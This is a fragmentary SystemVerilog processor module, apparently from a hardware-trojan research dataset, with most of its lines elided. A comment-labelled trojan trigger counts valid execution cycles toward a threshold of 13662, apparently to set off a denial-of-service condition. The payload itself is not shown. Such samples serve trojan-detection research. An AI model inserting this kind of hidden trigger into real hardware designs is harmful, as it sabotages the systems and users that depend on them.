...
//
// This module interfaces_trojan_DoS with the instruction cache, handles control
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13662)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13662;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (ex_valid_i) trojan_counter <= trojan_counter + 1;
